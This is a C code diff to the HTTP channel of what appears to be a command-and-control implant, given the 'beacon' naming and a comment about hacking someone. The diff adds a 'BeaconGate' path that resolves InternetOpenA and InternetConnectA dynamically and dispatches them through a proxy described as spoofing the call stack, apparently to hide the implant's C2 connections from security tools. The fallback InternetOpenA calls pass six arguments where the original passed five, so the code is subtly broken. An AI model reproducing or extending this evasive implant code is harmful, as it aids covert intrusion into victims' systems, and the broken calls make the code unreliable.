@@ -1,4 +1,5 @@
 #include "channel.h"
+#include "beacon_gate.h" /* C-58 gate: InternetOpenA/InternetConnectA */
 #include <string.h>
 #include <windows.h>
 #include <wininet.h>
@@ -48,19 +49,46 @@ void http_init(char * host, int port, char * ua) {
 		httpflags |= INTERNET_FLAG_NO_COOKIES;
 
 	/* 创建会话，但要考虑用户指定的代理配置 */
-	switch (setting_short(SETTING_PROXY_BEHAVIOR)) {
-		case PROXYB_PRECONFIG:
-			session_h = InternetOpenA(ua, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
-			break;
-		case PROXYB_DIRECT:
-			session_h = InternetOpenA(ua, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
-			break;
-		case PROXYB_MANUAL:
-		case PROXYB_MANUAL_CREDS:
-			session_h = InternetOpenA(ua, INTERNET_OPEN_TYPE_PROXY, setting_ptr(SETTING_PROXY_CONFIG), NULL, 0);
-			break;
-		default:
-			break;
+	{
+		DWORD acctype;
+		char * proxy = NULL;
+		int gate = gate_api_enabled(GATE_API_INTERNETOPENA);
+
+		switch (setting_short(SETTING_PROXY_BEHAVIOR)) {
+			case PROXYB_DIRECT:
+				acctype = INTERNET_OPEN_TYPE_DIRECT;
+				break;
+			case PROXYB_MANUAL:
+			case PROXYB_MANUAL_CREDS:
+				acctype = INTERNET_OPEN_TYPE_PROXY;
+				proxy = (char *)setting_ptr(SETTING_PROXY_CONFIG);
+				break;
+			default:
+				acctype = INTERNET_OPEN_TYPE_PRECONFIG;
+				break;
+		}
+		if (gate) {
+			/* C-58 BeaconGate: proxied InternetOpenA (spoofed stack) */
+			HMODULE wininet = GetModuleHandleA("wininet.dll");
+			typedef HINTERNET (WINAPI *IOAFN)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD);
+			IOAFN fn = wininet ? (IOAFN)GetProcAddress(wininet, "InternetOpenA") : NULL;
+			if (fn != NULL) {
+				FUNCTION_CALL fc = {0};
+				fc.functionPtr = (void *)fn;
+				fc.function = GATE_API_INTERNETOPENA;
+				fc.numOfArgs = 5;
+				fc.args[0] = (unsigned long long)ua;
+				fc.args[1] = (unsigned long long)acctype;
+				fc.args[2] = (unsigned long long)proxy;
+				fc.args[3] = 0;
+				fc.args[4] = 0;
+				session_h = (HINTERNET)gate_dispatch(&fc);
+			}
+			else
+				session_h = InternetOpenA(ua, acctype, proxy, NULL, NULL, 0);
+		}
+		else
+			session_h = InternetOpenA(ua, acctype, proxy, NULL, NULL, 0);
 	}
 
 	/* 4 minute timeout... this is fair I think; unless you're hacking someone on dialup. Then you're in trouble :P~
@@ -78,7 +106,31 @@ void http_init(char * host, int port, char * ua) {
 	memset(http_current_host, 0, sizeof(http_current_host));
 	if (host != NULL)
 		strncpy(http_current_host, host, sizeof(http_current_host) - 1);
-	connect_h = InternetConnectA(session_h, host, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, dummyContext);
+	if (gate_api_enabled(GATE_API_INTERNETCONNECTA)) {
+		/* C-58 BeaconGate: proxied InternetConnectA (spoofed stack) */
+		HMODULE wininet = GetModuleHandleA("wininet.dll");
+		typedef HINTERNET (WINAPI *ICAFN)(HINTERNET, LPCSTR, INTERNET_PORT, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR);
+		ICAFN fn = wininet ? (ICAFN)GetProcAddress(wininet, "InternetConnectA") : NULL;
+		if (fn != NULL) {
+			FUNCTION_CALL fc = {0};
+			fc.functionPtr = (void *)fn;
+			fc.function = GATE_API_INTERNETCONNECTA;
+			fc.numOfArgs = 8;
+			fc.args[0] = (unsigned long long)session_h;
+			fc.args[1] = (unsigned long long)host;
+			fc.args[2] = (unsigned long long)port;
+			fc.args[3] = (unsigned long long)NULL;
+			fc.args[4] = (unsigned long long)NULL;
+			fc.args[5] = (unsigned long long)INTERNET_SERVICE_HTTP;
+			fc.args[6] = 0;
+			fc.args[7] = (unsigned long long)dummyContext;
+			connect_h = (HINTERNET)gate_dispatch(&fc);
+		}
+		else
+			connect_h = InternetConnectA(session_h, host, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, dummyContext);
+	}
+	else
+		connect_h = InternetConnectA(session_h, host, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, dummyContext);
 
 	/* 如果我们有凭据，立即将它们分配给这个连接 */
 	if (setting_short(SETTING_PROXY_BEHAVIOR) == PROXYB_MANUAL_CREDS) {
